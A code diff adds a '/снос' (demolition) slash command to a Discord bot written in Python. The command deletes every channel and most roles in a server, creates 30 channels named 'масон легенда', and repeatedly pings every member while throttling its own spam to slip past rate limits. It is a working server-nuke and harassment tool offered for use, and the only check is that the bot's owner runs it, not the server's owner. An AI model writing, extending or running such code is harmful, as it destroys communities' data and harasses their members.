@@ -1749,6 +1749,76 @@ async def mass_move(interaction: discord.Interaction):
     embed.set_footer(text=f"Выполнил: {interaction.user}")
     await interaction.response.send_message(embed=embed)
 
+# === /снос ===
+@bot.tree.command(name="снос", description="Полный снос сервера (ТОЛЬКО ВЛАДЕЛЕЦ)")
+async def nuke_server(interaction: discord.Interaction):
+    if interaction.user.id != OWNER_ID:
+        await interaction.response.send_message("❌ Только владелец может использовать эту команду.", ephemeral=True)
+        return
+
+    await interaction.response.send_message("🧨 Начинаю снос сервера...", ephemeral=True)
+
+    guild = interaction.guild
+
+    # === УДАЛЕНИЕ ВСЕХ КАНАЛОВ ===
+    deleted_channels = 0
+    for channel in list(guild.channels):
+        try:
+            await channel.delete(reason="Снос сервера")
+            deleted_channels += 1
+        except Exception:
+            pass  # Игнорируем ошибки (например, недостаточно прав)
+
+    # === УДАЛЕНИЕ ВСЕХ РОЛЕЙ (кроме @everyone и роли бота) ===
+    deleted_roles = 0
+    for role in reversed(guild.roles):  # удаляем снизу вверх, чтобы избежать конфликтов
+        if role.is_default() or role.managed or role == guild.me.top_role or role > guild.me.top_role:
+            continue
+        try:
+            await role.delete(reason="Снос сервера")
+            deleted_roles += 1
+        except Exception:
+            pass
+
+    # === СОЗДАНИЕ 30 КАНАЛОВ ===
+    created_channels = []
+    for i in range(30):
+        try:
+            channel = await guild.create_text_channel("масон легенда")
+            created_channels.append(channel)
+        except Exception:
+            pass
+
+    # === ОТПРАВКА СООБЩЕНИЙ В КАЖДЫЙ КАНАЛ ===
+    mention_all = " ".join([member.mention for member in guild.members if not member.bot])
+    if not mention_all.strip():
+        mention_all = "@everyone"
+
+    for channel in created_channels:
+        try:
+            # Отправляем до 5 сообщений (Discord может ограничить массовые упоминания)
+            for _ in range(3):  # 3 раза — чтобы не триггерить рейт-лимит сильно
+                await channel.send(f"{mention_all}\nМАСОН ЛЕГЕНДА")
+                await asyncio.sleep(0.5)
+        except Exception:
+            pass
+
+    # === ФИНАЛЬНЫЙ ОТЧЁТ ===
+    embed = discord.Embed(
+        title="💥 Снос завершён!",
+        description=(
+            f"🗑️ Удалено каналов: **{deleted_channels}**\n"
+            f"🎭 Удалено ролей: **{deleted_roles}**\n"
+            f"🆕 Создано каналов: **{len(created_channels)}**\n"
+            f"📢 Во всех каналах отправлено упоминание + сообщение."
+        ),
+        color=0xff0000
+    )
+    try:
+        await interaction.followup.send(embed=embed, ephemeral=False)
+    except:
+        pass
+
 # === ЗАПУСК ===
 if __name__ == "__main__":
     bot.run(TOKEN)
